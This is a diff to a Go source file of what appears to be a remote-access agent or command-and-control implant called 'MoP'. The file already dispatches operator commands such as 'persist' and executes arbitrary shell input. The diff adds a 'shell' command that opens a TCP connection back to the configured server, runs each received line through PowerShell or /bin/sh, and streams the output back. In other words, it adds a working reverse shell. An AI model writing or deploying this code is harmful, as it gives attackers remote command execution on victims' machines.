@@ -1,16 +1,21 @@
 package commands
 
 import (
+	"MoP/src/config"
 	"MoP/src/middlewares"
 	"MoP/src/models"
 	"MoP/src/requests"
+	"bufio"
 	"encoding/base64"
+	"encoding/binary"
 	"fmt"
 	"image/png"
+	"net"
 	"os"
 	"os/exec"
 	"os/user"
 	"path/filepath"
+	"runtime"
 	"strconv"
 
 	"github.com/mitchellh/go-ps"
@@ -66,10 +71,61 @@ func HandleAgentCommands(ID int, command string, agent models.NewAgent) {
 	case "persist":
 		resp := persistAgent(agent)
 		requests.PostCommand(ID, command, resp, agent)
+	case "shell":
+		resp := shell(slicedCommand)
+		requests.PostCommand(ID, command, resp, agent)
 	default:
 		resp := shellCommand(command, agent)
 		// resp := B64Encode("This command doesn't exists or not implemented yet!")
 		requests.PostCommand(ID, command, resp, agent)
+	}
+
+}
+
+func shell(slicedCommand []string) string {
+	var port = "8081"
+	var resp = "U2hlbGwgZXhlY3V0ZWQ="
+	if len(slicedCommand) > 1 {
+		port = slicedCommand[1]
+	}
+
+	server := fmt.Sprintf("%s:%s", config.Load().Server, port)
+	conn, err := net.Dial("tcp", server)
+	if err != nil {
+		resp = middlewares.B64Encode(err.Error())
+		return resp
+	}
+	defer conn.Close()
+
+	for {
+		message, err := bufio.NewReader(conn).ReadString('\n')
+		if err != nil {
+			resp = middlewares.B64Encode(err.Error())
+			return resp
+		}
+
+		var cmd *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("powershell.exe", "/C", message)
+		} else {
+			cmd = exec.Command("/bin/sh", "-c", message)
+		}
+
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			output = append(output, []byte(fmt.Sprintf("\nError: %s", err.Error()))...)
+		}
+
+		length := uint32(len(output))
+		err = binary.Write(conn, binary.LittleEndian, length)
+		if err != nil {
+			continue
+		}
+
+		_, err = conn.Write(output)
+		if err != nil {
+			continue
+		}
 	}
 
 }
